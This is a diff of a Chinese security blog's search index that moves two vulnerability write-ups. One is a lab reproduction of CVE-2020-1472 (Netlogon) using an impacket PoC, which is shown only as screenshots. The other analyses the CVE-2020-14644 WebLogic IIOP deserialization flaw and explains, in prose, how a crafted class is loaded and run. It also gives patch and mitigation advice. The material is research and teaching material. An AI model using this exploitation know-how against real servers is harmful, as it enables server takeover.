@@ -175,49 +175,6 @@
       </tags>
   </entry>
   <entry>
-    <title>0x02CVE-2020-1472漏洞复现</title>
-    <url>/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h4 id="CVE-2020-1472漏洞复现"><a href="#CVE-2020-1472漏洞复现" class="headerlink" title="CVE-2020-1472漏洞复现"></a>CVE-2020-1472漏洞复现</h4><p>用了大半天时间，开局一张图，复现全靠蒙：</p>
-<p>参考宽字节安全的推文：<a href="https://mp.weixin.qq.com/s/MSLbzg2hCoTSVTtEIxxpNQ">https://mp.weixin.qq.com/s/MSLbzg2hCoTSVTtEIxxpNQ</a></p>
-<p><a href="https://asciinema.org/a/359607">https://asciinema.org/a/359607</a></p>
-<a id="more"></a>
-
-<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915162012996.png" alt="image-20200915162012996"></p>
-<h5 id="0x1-搭建一个windows的域环境"><a href="#0x1-搭建一个windows的域环境" class="headerlink" title="0x1 搭建一个windows的域环境"></a>0x1 搭建一个windows的域环境</h5><p>搭建参考：<a href="https://blog.csdn.net/wwl012345/article/details/88934571">https://blog.csdn.net/wwl012345/article/details/88934571</a></p>
-<p>发现电脑里有一个win2008r2的虚拟机，就用这个了</p>
-<p>更改IP和DNS</p>
-<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161742282.png" alt="image-20200915161742282"></p>
-<p>添加角色</p>
-<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161849769.png" alt="image-20200915161849769"></p>
-<p>根据提示，运行dcpromo.exe添加DNS服务器</p>
-<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161801701.png" alt="image-20200915161801701"></p>
-<p>记录域名</p>
-<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161902861.png" alt="image-20200915161902861"></p>
-<p>此时，域环境已经搭建完成</p>
-<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161930572.png" alt="image-20200915161930572"></p>
-<p>以防万一我还看了下服务里netlogon有没有开</p>
-<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161950769.png" alt="image-20200915161950769"></p>
-<h5 id="0x2-使用kali运行poc脚本进行攻击"><a href="#0x2-使用kali运行poc脚本进行攻击" class="headerlink" title="0x2 使用kali运行poc脚本进行攻击"></a>0x2 使用kali运行poc脚本进行攻击</h5><p>先装一个kali虚拟机，好久没装了中间还出现了点小问题</p>
-<p>装完Kali之后，更改下ip和dns服务器，新建一个配置1</p>
-<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180721906.png" alt="image-20200915180721906"></p>
-<p>然后安装impacket,参考：<a href="https://www.freebuf.com/sectool/175208.html">https://www.freebuf.com/sectool/175208.html</a></p>
-<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180851531.png" alt="image-20200915180851531"></p>
-<p>装好之后拷入poc脚本</p>
-<p>之后是导入各种模块和无限的debug…..修改了下脚本</p>
-<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180942451.png" alt="image-20200915180942451"></p>
-<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180900178.png" alt="image-20200915180900178"></p>
-<p>运行脚本，复现成功：</p>
-<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180918659.png" alt="image-20200915180918659"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>netlogon</tag>
-        <tag>域</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>0x01第一个docker漏洞环境搭建复现fastjson</title>
     <url>/2020/09/03/0x01%E7%AC%AC%E4%B8%80%E4%B8%AAdocker%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0fastjson/</url>
     <content><![CDATA[<h4 id="第一个docker漏洞环境搭建复现"><a href="#第一个docker漏洞环境搭建复现" class="headerlink" title="第一个docker漏洞环境搭建复现"></a>第一个docker漏洞环境搭建复现</h4><p>由于某原因要进行fastjson漏洞的复现，已获得脚本及exp</p>
@@ -264,63 +221,46 @@
       </tags>
   </entry>
   <entry>
-    <title>0x03CVE-2020-14644 weblogic iiop反序列化漏洞分析</title>
-    <url>/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h3 id="CVE-2020-14644-weblogic-iiop反序列化漏洞分析"><a href="#CVE-2020-14644-weblogic-iiop反序列化漏洞分析" class="headerlink" title="CVE-2020-14644 weblogic iiop反序列化漏洞分析"></a>CVE-2020-14644 weblogic iiop反序列化漏洞分析</h3><p>参考：</p>
-<p>0x1 <a href="https://my.oschina.net/u/4280983/blog/4477476">https://my.oschina.net/u/4280983/blog/4477476</a></p>
-<p>0x2 宽字节的推文</p>
+    <title>0x02CVE-2020-1472漏洞复现</title>
+    <url>/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h4 id="CVE-2020-1472漏洞复现"><a href="#CVE-2020-1472漏洞复现" class="headerlink" title="CVE-2020-1472漏洞复现"></a>CVE-2020-1472漏洞复现</h4><p>用了大半天时间，开局一张图，复现全靠蒙：</p>
+<p>参考宽字节安全的推文：<a href="https://mp.weixin.qq.com/s/MSLbzg2hCoTSVTtEIxxpNQ">https://mp.weixin.qq.com/s/MSLbzg2hCoTSVTtEIxxpNQ</a></p>
+<p><a href="https://asciinema.org/a/359607">https://asciinema.org/a/359607</a></p>
 <a id="more"></a>
 
-<h4 id="0x1-漏洞介绍"><a href="#0x1-漏洞介绍" class="headerlink" title="0x1 漏洞介绍"></a>0x1 漏洞介绍</h4><h5 id="0x01-WebLogic组件"><a href="#0x01-WebLogic组件" class="headerlink" title="0x01 WebLogic组件"></a>0x01 WebLogic组件</h5><p>WebLogic是美国Oracle公司出品的一个application server，是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器，适用于云环境和传统环境的应用服务器组件。</p>
-<h5 id="0x02-漏洞简介"><a href="#0x02-漏洞简介" class="headerlink" title="0x02 漏洞简介"></a>0x02 漏洞简介</h5><p>Oracle官方在2020年7月份发布的最新安全补丁中披露了此漏洞。此漏洞CVSS评分9.8，<strong>受影响的版本是12.2.1.3.0、12.2.1.4.0和14.1.1.0.0</strong>。该漏洞允许未经身份验证的攻击者通过 IIOP , T3 进行网络访问，攻击者成功攻击此漏洞可能导致Oracle WebLogic Server被接管。</p>
-<h4 id="0x2-漏洞分析"><a href="#0x2-漏洞分析" class="headerlink" title="0x2 漏洞分析"></a>0x2 漏洞分析</h4><h5 id="0x01-相关知识"><a href="#0x01-相关知识" class="headerlink" title="0x01 相关知识"></a>0x01 相关知识</h5><h6 id="JDK的classloader类和defineClass方法"><a href="#JDK的classloader类和defineClass方法" class="headerlink" title="JDK的classloader类和defineClass方法"></a>JDK的classloader类和defineClass方法</h6><p>​    一个类在被使用之前，会经历class文件生成—&gt;加载—&gt;连接—&gt;初始化等阶段。其中加载阶段主要完成三件事：1、通过类的全限定名来获取定义次类的二进制字节流，2、将该二进制字节流定义的静态数据结构转换成方法区的运行时数据结构，3、在内存中生成一个代表该类的Class对象，供外部通过该对象来获取类的元数据信息。</p>
-<p>​    JDK中的ClassLoader类中有个方法是defineClass，可以根据类全限定名和类的字节数组，加载一个类并返回对应的Class对象到 JVM（Java Virtual Machine）中。</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110556771.png" alt="image-20201015110556771"></p>
-<p>如上图所示，如果参数’name’（类名）和’b’（类文件的二进制数据）可控，理论上我们可以加载任何类，我们可以通过该方法，构造符合class格式的bytes数组作为类去加载。（注意：1、一般情况下，通过defineClass加载的类不允许同名，2、一个类中的类名name和类字节数组b中的类名要对应）</p>
-<h6 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h6><p>​    javassist是一个开源的分析、编辑和创建Java字节码的类库。它提供了更高级的API，执行效率相对ASM较差，但无需掌握字节码指令的知识，对使用者要求较低。它直接使用java编码的形式，不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。</p>
-<h5 id="0x02-漏洞代码分析"><a href="#0x02-漏洞代码分析" class="headerlink" title="0x02 漏洞代码分析"></a>0x02 漏洞代码分析</h5><p>该漏洞的原理是在反序列化时，通过使用defineClass方法，加载恶意类。</p>
-<p>关键类：com.tangosol.internal.util.invoke.RemoteConstructor</p>
-<p>在RemoteConstructor类中，构造实例的代码如下：</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014111222573.png" alt="image-20201014111222573"></p>
-<p>其中RemotableSupport类，可以理解为是coherence自定义的Classloader，在其中实现了defineClass，具有加载类的功能。查看其中的realize方法：</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110307308.png" alt="image-20201015110307308"></p>
-<p>先执行this.registerIfAbsent(constructor.getDefinition())方法</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110341915.png" alt="image-20201015110341915"></p>
-<p>RemotableSupport中定义了 Map 类型的 f_mapDefinitions 的变量充当缓存，每次调用realize时就会先在缓存中查找ClassDefinition。</p>
-<p>执行完成后，调用getRemotableClass方法，获取clz。查看ClassDefinition类</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014112030482.png" alt="image-20201014112030482"></p>
-<p>可以看到getRemotableClass返回m_clz,并且m_clz是用transient修饰的（transient的含义：将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会被序列化，最终变量为NULL）</p>
-<p>所以clz为NULL。于是在realize方法中，就会进入if分支，调用defineClass加载恶意类字节码。</p>
-<p>RemotableSupport 继承了ClassLoader，所以它的 defineClass 就是调用了父类的 defineClass来加载类。</p>
-<p>需要注意的是BinClassName变量的命名，使用的是ClassIdentity类中的getName方法</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110410957.png" alt="image-20201015110410957"></p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110448486.png" alt="image-20201015110448486"></p>
-<p>ClassIdentity类中的构造方法是将clazz作为参数，然后提取该类的一些特征信息，如Basename等。其中getName函数可以简化为：getName() = package + “/“ + baseName + “$” + version</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014105230694.png" alt="image-20201014105230694"></p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014105430256.png" alt="image-20201014105430256"></p>
-<p>所以 ClassIdentity 中的字节数组 byte[] 中的对应的 Class 的类名必须为 package + “.” + baseName + “$” + version，否则可能会加载失败。</p>
-<p>继续分析realize方法，加载类之后调用了createInstance方法</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014152406910.png" alt="image-20201014152406910"></p>
-<p>aoArgs作为参数进行实例化对象，所以将恶意代码写在构造方法中，实例化之后就会执行恶意代码。</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110636109.png" alt="image-20201015110636109"></p>
-<p> 所以只要构造一个带有包名类的恶意代码写进构造函数中，通过 javassist动态修改类名，将原类名加上 $ 和 version 值对应，通过iiop协议和反序列化发送给weblogic服务器，即可实现漏洞利用</p>
-<h4 id="0x3-漏洞复现"><a href="#0x3-漏洞复现" class="headerlink" title="0x3 漏洞复现"></a>0x3 漏洞复现</h4><h5 id="0x01-漏洞利用-弹计算器"><a href="#0x01-漏洞利用-弹计算器" class="headerlink" title="0x01 漏洞利用-弹计算器"></a>0x01 漏洞利用-弹计算器</h5><p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110723660.png" alt="image-20201015110723660"></p>
-<h5 id="0x02-漏洞利用-信息回显"><a href="#0x02-漏洞利用-信息回显" class="headerlink" title="0x02 漏洞利用-信息回显"></a>0x02 漏洞利用-信息回显</h5><p>1、开启weblogic服务器</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110854978.png" alt="image-20201015110854978"></p>
-<p>2、查看weblogic服务器的网络配置信息</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110937437.png" alt="image-20201015110937437"></p>
-<p>3、在攻击机上，编写特制的恶意类（写入weblogic服务器的Ip和weblogic服务的端口以及攻击命令），打包jar包，运行，就可以直接获取到weblogic服务器的信息</p>
-<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201109171158094.png" alt="image-20201109171158094"></p>
-<h4 id="0x4-漏洞防护方案"><a href="#0x4-漏洞防护方案" class="headerlink" title="0x4 漏洞防护方案"></a>0x4 漏洞防护方案</h4><h5 id="0x01-官方方案："><a href="#0x01-官方方案：" class="headerlink" title="0x01 官方方案："></a>0x01 官方方案：</h5><p>官方已经针对此漏洞发布补丁，请受影响的用户参考以下链接安装补丁更新：</p>
-<p><a href="https://www.oracle.com/security-alerts/cpujul2020.html">https://www.oracle.com/security-alerts/cpujul2020.html</a></p>
-<h5 id="0x02-临时解决方案："><a href="#0x02-临时解决方案：" class="headerlink" title="0x02 临时解决方案："></a>0x02 临时解决方案：</h5><h6 id="关闭IIOP协议："><a href="#关闭IIOP协议：" class="headerlink" title="关闭IIOP协议："></a>关闭IIOP协议：</h6><p>在WebLogic控制台中，选择“服务”-&gt;”AdminServer”-&gt;”协议”，取消“启用IIOP”的勾选。并重启WebLogic项目，使配置生效。</p>
-<h6 id="控制T3服务："><a href="#控制T3服务：" class="headerlink" title="控制T3服务："></a>控制T3服务：</h6><p>在WebLogic界面中选择安全-筛选器，在下方出现的界面中找到“连接筛选器”，在里面输入：security.net.ConnectionFilterImpl，然后在连接筛选器规则中输入：127.0.0.1 * * allow t3 t3s，0.0.0.0/0 * * deny t3 t3s。最后保存并重启服务器即可生效。</p>
+<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915162012996.png" alt="image-20200915162012996"></p>
+<h5 id="0x1-搭建一个windows的域环境"><a href="#0x1-搭建一个windows的域环境" class="headerlink" title="0x1 搭建一个windows的域环境"></a>0x1 搭建一个windows的域环境</h5><p>搭建参考：<a href="https://blog.csdn.net/wwl012345/article/details/88934571">https://blog.csdn.net/wwl012345/article/details/88934571</a></p>
+<p>发现电脑里有一个win2008r2的虚拟机，就用这个了</p>
+<p>更改IP和DNS</p>
+<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161742282.png" alt="image-20200915161742282"></p>
+<p>添加角色</p>
+<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161849769.png" alt="image-20200915161849769"></p>
+<p>根据提示，运行dcpromo.exe添加DNS服务器</p>
+<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161801701.png" alt="image-20200915161801701"></p>
+<p>记录域名</p>
+<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161902861.png" alt="image-20200915161902861"></p>
+<p>此时，域环境已经搭建完成</p>
+<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161930572.png" alt="image-20200915161930572"></p>
+<p>以防万一我还看了下服务里netlogon有没有开</p>
+<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161950769.png" alt="image-20200915161950769"></p>
+<h5 id="0x2-使用kali运行poc脚本进行攻击"><a href="#0x2-使用kali运行poc脚本进行攻击" class="headerlink" title="0x2 使用kali运行poc脚本进行攻击"></a>0x2 使用kali运行poc脚本进行攻击</h5><p>先装一个kali虚拟机，好久没装了中间还出现了点小问题</p>
+<p>装完Kali之后，更改下ip和dns服务器，新建一个配置1</p>
+<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180721906.png" alt="image-20200915180721906"></p>
+<p>然后安装impacket,参考：<a href="https://www.freebuf.com/sectool/175208.html">https://www.freebuf.com/sectool/175208.html</a></p>
+<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180851531.png" alt="image-20200915180851531"></p>
+<p>装好之后拷入poc脚本</p>
+<p>之后是导入各种模块和无限的debug…..修改了下脚本</p>
+<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180942451.png" alt="image-20200915180942451"></p>
+<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180900178.png" alt="image-20200915180900178"></p>
+<p>运行脚本，复现成功：</p>
+<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180918659.png" alt="image-20200915180918659"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>weblogic</tag>
+        <tag>netlogon</tag>
+        <tag>域</tag>
       </tags>
   </entry>
   <entry>
@@ -424,6 +364,66 @@
       <categories>
         <category>ctf</category>
       </categories>
+  </entry>
+  <entry>
+    <title>0x03CVE-2020-14644 weblogic iiop反序列化漏洞分析</title>
+    <url>/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h3 id="CVE-2020-14644-weblogic-iiop反序列化漏洞分析"><a href="#CVE-2020-14644-weblogic-iiop反序列化漏洞分析" class="headerlink" title="CVE-2020-14644 weblogic iiop反序列化漏洞分析"></a>CVE-2020-14644 weblogic iiop反序列化漏洞分析</h3><p>参考：</p>
+<p>0x1 <a href="https://my.oschina.net/u/4280983/blog/4477476">https://my.oschina.net/u/4280983/blog/4477476</a></p>
+<p>0x2 宽字节的推文</p>
+<a id="more"></a>
+
+<h4 id="0x1-漏洞介绍"><a href="#0x1-漏洞介绍" class="headerlink" title="0x1 漏洞介绍"></a>0x1 漏洞介绍</h4><h5 id="0x01-WebLogic组件"><a href="#0x01-WebLogic组件" class="headerlink" title="0x01 WebLogic组件"></a>0x01 WebLogic组件</h5><p>WebLogic是美国Oracle公司出品的一个application server，是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器，适用于云环境和传统环境的应用服务器组件。</p>
+<h5 id="0x02-漏洞简介"><a href="#0x02-漏洞简介" class="headerlink" title="0x02 漏洞简介"></a>0x02 漏洞简介</h5><p>Oracle官方在2020年7月份发布的最新安全补丁中披露了此漏洞。此漏洞CVSS评分9.8，<strong>受影响的版本是12.2.1.3.0、12.2.1.4.0和14.1.1.0.0</strong>。该漏洞允许未经身份验证的攻击者通过 IIOP , T3 进行网络访问，攻击者成功攻击此漏洞可能导致Oracle WebLogic Server被接管。</p>
+<h4 id="0x2-漏洞分析"><a href="#0x2-漏洞分析" class="headerlink" title="0x2 漏洞分析"></a>0x2 漏洞分析</h4><h5 id="0x01-相关知识"><a href="#0x01-相关知识" class="headerlink" title="0x01 相关知识"></a>0x01 相关知识</h5><h6 id="JDK的classloader类和defineClass方法"><a href="#JDK的classloader类和defineClass方法" class="headerlink" title="JDK的classloader类和defineClass方法"></a>JDK的classloader类和defineClass方法</h6><p>​    一个类在被使用之前，会经历class文件生成—&gt;加载—&gt;连接—&gt;初始化等阶段。其中加载阶段主要完成三件事：1、通过类的全限定名来获取定义次类的二进制字节流，2、将该二进制字节流定义的静态数据结构转换成方法区的运行时数据结构，3、在内存中生成一个代表该类的Class对象，供外部通过该对象来获取类的元数据信息。</p>
+<p>​    JDK中的ClassLoader类中有个方法是defineClass，可以根据类全限定名和类的字节数组，加载一个类并返回对应的Class对象到 JVM（Java Virtual Machine）中。</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110556771.png" alt="image-20201015110556771"></p>
+<p>如上图所示，如果参数’name’（类名）和’b’（类文件的二进制数据）可控，理论上我们可以加载任何类，我们可以通过该方法，构造符合class格式的bytes数组作为类去加载。（注意：1、一般情况下，通过defineClass加载的类不允许同名，2、一个类中的类名name和类字节数组b中的类名要对应）</p>
+<h6 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h6><p>​    javassist是一个开源的分析、编辑和创建Java字节码的类库。它提供了更高级的API，执行效率相对ASM较差，但无需掌握字节码指令的知识，对使用者要求较低。它直接使用java编码的形式，不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。</p>
+<h5 id="0x02-漏洞代码分析"><a href="#0x02-漏洞代码分析" class="headerlink" title="0x02 漏洞代码分析"></a>0x02 漏洞代码分析</h5><p>该漏洞的原理是在反序列化时，通过使用defineClass方法，加载恶意类。</p>
+<p>关键类：com.tangosol.internal.util.invoke.RemoteConstructor</p>
+<p>在RemoteConstructor类中，构造实例的代码如下：</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014111222573.png" alt="image-20201014111222573"></p>
+<p>其中RemotableSupport类，可以理解为是coherence自定义的Classloader，在其中实现了defineClass，具有加载类的功能。查看其中的realize方法：</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110307308.png" alt="image-20201015110307308"></p>
+<p>先执行this.registerIfAbsent(constructor.getDefinition())方法</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110341915.png" alt="image-20201015110341915"></p>
+<p>RemotableSupport中定义了 Map 类型的 f_mapDefinitions 的变量充当缓存，每次调用realize时就会先在缓存中查找ClassDefinition。</p>
+<p>执行完成后，调用getRemotableClass方法，获取clz。查看ClassDefinition类</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014112030482.png" alt="image-20201014112030482"></p>
+<p>可以看到getRemotableClass返回m_clz,并且m_clz是用transient修饰的（transient的含义：将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会被序列化，最终变量为NULL）</p>
+<p>所以clz为NULL。于是在realize方法中，就会进入if分支，调用defineClass加载恶意类字节码。</p>
+<p>RemotableSupport 继承了ClassLoader，所以它的 defineClass 就是调用了父类的 defineClass来加载类。</p>
+<p>需要注意的是BinClassName变量的命名，使用的是ClassIdentity类中的getName方法</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110410957.png" alt="image-20201015110410957"></p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110448486.png" alt="image-20201015110448486"></p>
+<p>ClassIdentity类中的构造方法是将clazz作为参数，然后提取该类的一些特征信息，如Basename等。其中getName函数可以简化为：getName() = package + “/“ + baseName + “$” + version</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014105230694.png" alt="image-20201014105230694"></p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014105430256.png" alt="image-20201014105430256"></p>
+<p>所以 ClassIdentity 中的字节数组 byte[] 中的对应的 Class 的类名必须为 package + “.” + baseName + “$” + version，否则可能会加载失败。</p>
+<p>继续分析realize方法，加载类之后调用了createInstance方法</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014152406910.png" alt="image-20201014152406910"></p>
+<p>aoArgs作为参数进行实例化对象，所以将恶意代码写在构造方法中，实例化之后就会执行恶意代码。</p>
+<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110636109.png" alt="image-20201015110636109"></p>
+<p> 所以只要构造一个带有包名类的恶意代码写进构造函数中，通过 javassist动态修改类名，将原类名加上 $ 和 version 值对应，通过iiop协议和反序列化发送给weblogic服务器，即可实现漏洞利用</p>
+<h4 id="0x3-漏洞复现"><a href="#0x3-漏洞复现" class="headerlink" title="0x3 漏洞复现"></a>0x3 漏洞复现</h4><h5 id="0x01-漏洞利用-弹计算器"><a href="#0x01-漏洞利用-弹计算器" class="headerlink" title="0x01 漏洞利用-弹计算器"></a>0x01 漏洞利用-弹计算器</h5><p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110723660.png" alt="image-20201015110723660"></p>
+<h5 id="0x02-漏洞利用-信息回显"><a href="#0x02-漏洞利用-信息回显" class="headerlink" title="0x02 漏洞利用-信息回显"></a>0x02 漏洞利用-信息回显</h5><p>1、开启weblogic服务器</p>
